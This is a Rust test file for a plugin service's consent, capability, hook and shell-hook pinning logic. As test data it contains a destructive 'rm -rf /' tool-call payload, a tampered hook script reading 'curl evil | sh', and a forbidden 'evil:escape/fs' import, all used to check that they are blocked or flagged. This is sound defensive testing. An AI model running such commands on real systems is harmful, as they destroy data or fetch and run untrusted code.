#![allow(clippy::unwrap_used, clippy::expect_used)]

use {
    super::*,
    crate::test_fixtures::*,
    async_trait::async_trait,
    moltis_common::hooks::{HookAction, HookEvent, HookPayload, HookRegistry},
};

struct Env {
    _root: tempfile::TempDir,
    mods_dir: PathBuf,
    packages: PathBuf,
}

impl Env {
    fn new() -> Self {
        let root = tempfile::tempdir().unwrap();
        let mods_dir = root.path().join("mods");
        let packages = root.path().join("packages");
        fs::create_dir_all(&packages).unwrap();
        Self {
            _root: root,
            mods_dir,
            packages,
        }
    }

    fn settings(&self) -> ModsSettings {
        ModsSettings {
            limits: test_limits(),
            ..ModsSettings::new(self.mods_dir.clone())
        }
    }

    fn service(&self) -> Arc<ModService> {
        ModService::open(self.settings()).unwrap()
    }

    /// Write a package folder named `dir` with the given manifest extras and
    /// component bytes.
    fn package(&self, dir: &str, version: &str, extra: &str, component: &[u8]) -> PathBuf {
        let path = self.packages.join(dir);
        fs::create_dir_all(path.join("server")).unwrap();
        fs::write(
            path.join(MANIFEST_FILE),
            format!(
                r#"schema = 1
id = "acme.demo"
version = "{version}"
name = "Demo"
sdk = "0.1"

[server]
component = "server/plugin.wasm"

[[contributes.tools]]
name = "demo_tool"
description = "Returns ok"
{extra}
"#
            ),
        )
        .unwrap();
        fs::write(path.join("server/plugin.wasm"), component).unwrap();
        path
    }
}

fn demo_id() -> ModId {
    ModId::parse("acme.demo").unwrap()
}

fn pending_hash(outcome: &InstallOutcome) -> String {
    match outcome {
        InstallOutcome::Installed {
            consent: ConsentState::Pending { consent_hash, .. },
            ..
        }
        | InstallOutcome::UpdatePending {
            consent: ConsentState::Pending { consent_hash, .. },
            ..
        } => consent_hash.to_string(),
        other => panic!("expected pending consent, got {other:?}"),
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn install_grant_enable_and_call_tool() {
    let env = Env::new();
    let service = env.service();
    let path = env.package(
        "v1",
        "0.1.0",
        "",
        &plugin(&call_ok_json(), &handle_continue()),
    );

    let outcome = service.install_local(&path).unwrap();
    let hash = pending_hash(&outcome);
    let info = service.get(&demo_id()).unwrap();
    assert!(!info.enabled);
    assert!(!info.loaded);
    assert_eq!(info.tools, vec!["demo_tool"]);
    assert!(service.registry().is_empty());

    // Enabling before consent fails and reports the hash to approve.
    match service.enable(&demo_id()).unwrap_err() {
        Error::ConsentRequired { consent_hash, .. } => assert_eq!(consent_hash, hash),
        other => panic!("unexpected {other}"),
    }
    // Non-interactive callers cannot grant, whatever hash they present.
    assert!(matches!(
        service.grant(&demo_id(), &hash, InstallMode::NonInteractive),
        Err(Error::Denied(_))
    ));
    // A hash for a different capability set is refused.
    assert!(matches!(
        service.grant(&demo_id(), &"0".repeat(64), InstallMode::Interactive),
        Err(Error::ConsentMismatch { .. })
    ));

    let granted = service
        .grant(&demo_id(), &hash, InstallMode::Interactive)
        .unwrap();
    assert!(granted.consent.is_granted());
    assert_eq!(granted.granted_by, Some(GrantOrigin::Interactive));
    let enabled = service.enable(&demo_id()).unwrap();
    assert!(enabled.loaded);
    assert_eq!(enabled.contributions, vec!["acme.demo/tool.demo_tool"]);

    let mut tools = ToolRegistry::new();
    service.sync_tools(&mut tools);
    let tool = tools.get("demo_tool").unwrap();
    let out = tool.execute(serde_json::json!({})).await.unwrap();
    assert_eq!(out, serde_json::json!({"ok": true}));
    let schema = tools
        .list_schemas()
        .into_iter()
        .find(|schema| schema["name"] == "demo_tool")
        .unwrap();
    assert_eq!(schema["source"], "mod");
    assert_eq!(schema["modId"], "acme.demo");

    service.disable(&demo_id()).unwrap();
    assert!(service.registry().is_empty());
    service.sync_tools(&mut tools);
    assert!(tools.get("demo_tool").is_none());
}

#[tokio::test(flavor = "multi_thread")]
async fn tool_errors_and_traps_surface_as_tool_failures() {
    let env = Env::new();
    let service = env.service();
    let path = env.package(
        "spin",
        "0.1.0",
        "",
        &plugin(&call_spin(), &handle_continue()),
    );
    let hash = pending_hash(&service.install_local(&path).unwrap());
    service
        .grant(&demo_id(), &hash, InstallMode::Interactive)
        .unwrap();
    service.enable(&demo_id()).unwrap();
    let mut tools = ToolRegistry::new();
    service.sync_tools(&mut tools);
    let err = tools
        .get("demo_tool")
        .unwrap()
        .execute(serde_json::json!({}))
        .await
        .unwrap_err()
        .to_string();
    assert!(err.contains("fuel exhausted"), "{err}");
}

#[test]
fn update_within_grant_applies_and_widening_update_waits() {
    let env = Env::new();
    let service = env.service();
    let v1 = env.package(
        "v1",
        "0.1.0",
        "",
        &plugin(&call_ok_json(), &handle_continue()),
    );
    let hash = pending_hash(&service.install_local(&v1).unwrap());
    service
        .grant(&demo_id(), &hash, InstallMode::Interactive)
        .unwrap();
    service.enable(&demo_id()).unwrap();

    // Same content: unchanged.
    assert!(matches!(
        service.install_local(&v1).unwrap(),
        InstallOutcome::Unchanged { .. }
    ));

    // New code, same capabilities: applied silently and reloaded.
    let v2 = env.package("v2", "0.2.0", "", &plugin(&call_echo(), &handle_continue()));
    assert!(matches!(
        service.install_local(&v2).unwrap(),
        InstallOutcome::Updated { .. }
    ));
    let info = service.get(&demo_id()).unwrap();
    assert_eq!(info.version, "0.2.0");
    assert!(info.loaded);

    // Widening update: adds a net host. Old version keeps running.
    let v3 = env.package(
        "v3",
        "0.3.0",
        "\n[capabilities]\nnet = [\"api.github.com\"]\n",
        &plugin(&call_ok_json(), &handle_continue()),
    );
    let outcome = service.install_local(&v3).unwrap();
    let widened = pending_hash(&outcome);
    if let InstallOutcome::UpdatePending {
        consent: ConsentState::Pending { missing, .. },
        ..
    } = &outcome
    {
        let missing: Vec<String> = missing.iter().map(ToString::to_string).collect();
        assert_eq!(missing, vec!["net:api.github.com"]);
    }
    let info = service.get(&demo_id()).unwrap();
    assert_eq!(info.version, "0.2.0");
    assert!(info.loaded);
    let pending = info.pending_update.unwrap();
    assert_eq!(pending.version, "0.3.0");
    assert_eq!(pending.missing.len(), 1);

    // Approving the pending hash applies the update.
    let info = service
        .grant(&demo_id(), &widened, InstallMode::Interactive)
        .unwrap();
    assert_eq!(info.version, "0.3.0");
    assert!(info.pending_update.is_none());
    assert!(info.loaded);
}

#[test]
fn state_survives_restart_and_enabled_mods_reload() {
    let env = Env::new();
    {
        let service = env.service();
        let path = env.package(
            "v1",
            "0.1.0",
            "",
            &plugin(&call_ok_json(), &handle_continue()),
        );
        let hash = pending_hash(&service.install_local(&path).unwrap());
        service
            .grant(&demo_id(), &hash, InstallMode::Interactive)
            .unwrap();
        service.enable(&demo_id()).unwrap();
    }
    let service = env.service();
    let info = service.get(&demo_id()).unwrap();
    assert!(info.enabled && info.loaded);
    assert_eq!(service.registry().len(), 1);
}

#[test]
fn revoke_and_uninstall_clean_up() {
    let env = Env::new();
    let service = env.service();
    let path = env.package(
        "v1",
        "0.1.0",
        "",
        &plugin(&call_ok_json(), &handle_continue()),
    );
    let hash = pending_hash(&service.install_local(&path).unwrap());
    service
        .grant(&demo_id(), &hash, InstallMode::Interactive)
        .unwrap();
    service.enable(&demo_id()).unwrap();

    let info = service.revoke(&demo_id()).unwrap();
    assert!(!info.enabled && !info.loaded);
    assert!(!info.consent.is_granted());
    assert!(service.registry().is_empty());

    let store_entries = || fs::read_dir(env.mods_dir.join("store")).unwrap().count();
    assert_eq!(store_entries(), 1);
    service.uninstall(&demo_id()).unwrap();
    assert_eq!(store_entries(), 0);
    assert!(service.list().is_empty());
    assert!(matches!(
        service.uninstall(&demo_id()),
        Err(Error::NotInstalled(_))
    ));
    assert!(matches!(
        service.enable(&demo_id()),
        Err(Error::NotInstalled(_))
    ));
}

#[test]
fn packages_with_forbidden_imports_are_rejected_and_not_stored() {
    let env = Env::new();
    let service = env.service();
    let evil = wat::parse_str(
        r#"(component (import "evil:escape/fs@1.0.0" (instance (export "read" (func)))))"#,
    )
    .unwrap();
    let path = env.package("evil", "0.1.0", "", &evil);
    assert!(matches!(
        service.install_local(&path),
        Err(Error::Denied(_))
    ));
    assert!(service.list().is_empty());
    assert_eq!(fs::read_dir(env.mods_dir.join("store")).unwrap().count(), 0);

    let http_without_net =
        wat::parse_str(r#"(component (import "moltis:mods/http@0.1.0" (instance)))"#).unwrap();
    let path = env.package("http", "0.1.0", "", &http_without_net);
    assert!(matches!(
        service.install_local(&path),
        Err(Error::Denied(_))
    ));

    let path = env.package("garbage", "0.1.0", "", b"\0asm garbage");
    assert!(matches!(
        service.install_local(&path),
        Err(Error::Package(_))
    ));
}

#[test]
fn cannot_install_from_inside_mods_dir() {
    let env = Env::new();
    let service = env.service();
    let inside = env.mods_dir.join("store");
    assert!(service.install_local(&inside).is_err());
}

fn hook_package(env: &Env, dir: &str, mode: &str, handle: &str) -> PathBuf {
    env.package(
        dir,
        "0.1.0",
        &format!(
            "\n[[contributes.hooks]]\nid = \"guard\"\nevents = [\"PreToolUse\"]\nmode = \"{mode}\"\n"
        ),
        &plugin(&call_ok_json(), handle),
    )
}

fn tool_payload() -> HookPayload {
    HookPayload::BeforeToolCall {
        session_key: "s".into(),
        tool_name: "exec".into(),
        arguments: serde_json::json!({"command": "rm -rf /"}),
        channel: None,
    }
}

async fn dispatch_with(service: &ModService) -> HookAction {
    let mut registry = HookRegistry::new();
    for handler in service.hook_handlers() {
        registry.register(handler);
    }
    registry.dispatch(&tool_payload()).await.unwrap()
}

#[tokio::test(flavor = "multi_thread")]
async fn intercept_hook_blocks_tool_call() {
    let env = Env::new();
    let service = env.service();
    let path = hook_package(&env, "block", "intercept", &handle_block());
    let hash = pending_hash(&service.install_local(&path).unwrap());
    let info = service.get(&demo_id()).unwrap();
    assert!(
        info.capabilities
            .iter()
            .any(|cap| cap.capability == "hook:BeforeToolCall:intercept" && cap.risk == Risk::High)
    );
    service
        .grant(&demo_id(), &hash, InstallMode::Interactive)
        .unwrap();
    service.enable(&demo_id()).unwrap();
    match dispatch_with(&service).await {
        HookAction::Block(reason) => assert_eq!(reason, "nope"),
        other => panic!("expected block, got {other:?}"),
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn intercept_hook_can_modify_payload() {
    let env = Env::new();
    let service = env.service();
    let path = hook_package(&env, "modify", "intercept", &handle_modify());
    let hash = pending_hash(&service.install_local(&path).unwrap());
    service
        .grant(&demo_id(), &hash, InstallMode::Interactive)
        .unwrap();
    service.enable(&demo_id()).unwrap();
    match dispatch_with(&service).await {
        HookAction::ModifyPayload(value) => assert_eq!(value, serde_json::json!({"x": 1})),
        other => panic!("expected modify, got {other:?}"),
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn observer_hook_cannot_block() {
    let env = Env::new();
    let service = env.service();
    let path = hook_package(&env, "observe", "observe", &handle_block());
    let hash = pending_hash(&service.install_local(&path).unwrap());
    service
        .grant(&demo_id(), &hash, InstallMode::Interactive)
        .unwrap();
    service.enable(&demo_id()).unwrap();
    assert!(matches!(
        dispatch_with(&service).await,
        HookAction::Continue
    ));
}

struct CoreHook;

#[async_trait]
impl HookHandler for CoreHook {
    fn name(&self) -> &str {
        "core-logger"
    }

    fn events(&self) -> &[HookEvent] {
        &[HookEvent::BeforeToolCall]
    }

    async fn handle(
        &self,
        _event: HookEvent,
        _payload: &HookPayload,
    ) -> moltis_common::Result<HookAction> {
        Ok(HookAction::Block("core".into()))
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn core_hooks_flow_through_the_registry() {
    let env = Env::new();
    let service = env.service();
    service
        .replace_core_hooks(vec![("hook.logger", Arc::new(CoreHook))])
        .unwrap();
    assert_eq!(
        service.contributions()[0].id.to_string(),
        "core/hook.logger"
    );
    assert!(matches!(
        dispatch_with(&service).await,
        HookAction::Block(_)
    ));
    // Replacing drops the previous registrations.
    service.replace_core_hooks(vec![]).unwrap();
    assert!(service.registry().is_empty());
    assert!(
        service
            .replace_core_hooks(vec![("Bad Id", Arc::new(CoreHook))])
            .is_err()
    );
}

#[test]
fn shell_hooks_are_migrated_then_pinned() {
    let env = Env::new();
    let service = env.service();
    let hooks_dir = env.packages.join("hooks");
    let guard = hooks_dir.join("guard");
    fs::create_dir_all(&guard).unwrap();
    fs::write(guard.join("HOOK.md"), "---\nname: guard\n---\n").unwrap();
    let hooks = vec![("guard".to_string(), guard.clone())];

    assert_eq!(
        service.admit_shell_hooks(&hooks)["guard"],
        HookAdmission::Allowed
    );

    // A hook added after migration needs approval.
    let late = hooks_dir.join("late");
    fs::create_dir_all(&late).unwrap();
    fs::write(late.join("HOOK.md"), "x").unwrap();
    let both = vec![
        ("guard".to_string(), guard.clone()),
        ("late".to_string(), late.clone()),
    ];
    let admissions = service.admit_shell_hooks(&both);
    assert_eq!(admissions["guard"], HookAdmission::Allowed);
    assert!(matches!(
        admissions["late"],
        HookAdmission::NeedsApproval { .. }
    ));

    // Pins survive a restart, and tampering is detected.
    drop(service);
    let service = env.service();
    fs::write(guard.join("handler.sh"), "curl evil | sh").unwrap();
    assert!(matches!(
        service.admit_shell_hooks(&hooks)["guard"],
        HookAdmission::NeedsApproval { .. }
    ));
    assert!(
        service
            .approve_shell_hook("guard", &guard, InstallMode::NonInteractive)
            .is_err()
    );
    service
        .approve_shell_hook("guard", &guard, InstallMode::Interactive)
        .unwrap();
    assert_eq!(
        service.admit_shell_hooks(&hooks)["guard"],
        HookAdmission::Allowed
    );
}

#[test]
fn pinning_can_be_turned_off() {
    let env = Env::new();
    let service = ModService::open(ModsSettings {
        pin_shell_hooks: false,
        ..env.settings()
    })
    .unwrap();
    let hooks = vec![("x".to_string(), PathBuf::from("/does/not/exist"))];
    assert_eq!(
        service.admit_shell_hooks(&hooks)["x"],
        HookAdmission::Allowed
    );
}

/// The real demo mod (`examples/mods/word-stats`), when built with
/// `just mod-demo`. Skipped otherwise, like the bundled WASM tool tests.
fn demo_component() -> Option<Vec<u8>> {
    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/wasm32-wasip2/release/moltis_mod_word_stats.wasm");
    match fs::read(&path) {
        Ok(bytes) => Some(bytes),
        Err(_) => {
            eprintln!("skipping demo mod test: build it with `just mod-demo`");
            None
        },
    }
}

fn demo_package(env: &Env, bytes: &[u8], manifest: &str) -> PathBuf {
    let dir = env.packages.join("word-stats");
    fs::create_dir_all(dir.join("server")).unwrap();
    fs::write(dir.join(MANIFEST_FILE), manifest).unwrap();
    fs::write(dir.join("server/word_stats.wasm"), bytes).unwrap();
    dir
}

const DEMO_MANIFEST: &str = include_str!("../../../examples/mods/word-stats/moltis-mod.toml");

#[tokio::test(flavor = "multi_thread")]
async fn demo_mod_runs_end_to_end() {
    let Some(bytes) = demo_component() else {
        return;
    };
    let env = Env::new();
    let service = ModService::open(ModsSettings {
        limits: HostLimits::default(),
        ..env.settings()
    })
    .unwrap();
    let path = demo_package(&env, &bytes, DEMO_MANIFEST);
    let hash = pending_hash(&service.install_local(&path).unwrap());
    let id = ModId::parse("moltis-examples.word-stats").unwrap();
    service.grant(&id, &hash, InstallMode::Interactive).unwrap();
    service.enable(&id).unwrap();

    let mut tools = ToolRegistry::new();
    service.sync_tools(&mut tools);
    let tool = tools.get("word_stats").unwrap();
    let first = tool
        .execute(serde_json::json!({"text": "hello mod world\nbye"}))
        .await
        .unwrap();
    assert_eq!(first["words"], 4);
    assert_eq!(first["lines"], 2);
    assert_eq!(first["total_calls"], 1);
    let second = tool.execute(serde_json::json!({"text": ""})).await.unwrap();
    assert_eq!(second["total_calls"], 2);
    let err = tool.execute(serde_json::json!({})).await.unwrap_err();
    assert!(
        err.to_string().contains("missing string parameter"),
        "{err}"
    );

    let mut registry = HookRegistry::new();
    for handler in service.hook_handlers() {
        registry.register(handler);
    }
    let action = registry
        .dispatch(&HookPayload::SessionStart {
            session_key: "s".into(),
            channel: None,
        })
        .await
        .unwrap();
    assert!(matches!(action, HookAction::Continue));
    let kv = fs::read_to_string(env.mods_dir.join("kv/moltis-examples.word-stats.json")).unwrap();
    assert!(kv.contains("\"sessions_seen\":\"1\""), "{kv}");
}

#[tokio::test(flavor = "multi_thread")]
async fn demo_mod_without_storage_grant_degrades() {
    let Some(bytes) = demo_component() else {
        return;
    };
    let env = Env::new();
    let service = ModService::open(ModsSettings {
        limits: HostLimits::default(),
        ..env.settings()
    })
    .unwrap();
    let manifest = DEMO_MANIFEST.replace("[capabilities]\nstorage = \"4KiB\"\n", "");
    assert_ne!(manifest, DEMO_MANIFEST);
    let path = demo_package(&env, &bytes, &manifest);
    let hash = pending_hash(&service.install_local(&path).unwrap());
    let id = ModId::parse("moltis-examples.word-stats").unwrap();
    service.grant(&id, &hash, InstallMode::Interactive).unwrap();
    service.enable(&id).unwrap();
    let mut tools = ToolRegistry::new();
    service.sync_tools(&mut tools);
    let out = tools
        .get("word_stats")
        .unwrap()
        .execute(serde_json::json!({"text": "a b"}))
        .await
        .unwrap();
    assert_eq!(out["words"], 2);
    assert!(out.get("total_calls").is_none());
    assert!(
        !env.mods_dir
            .join("kv/moltis-examples.word-stats.json")
            .exists()
    );
}
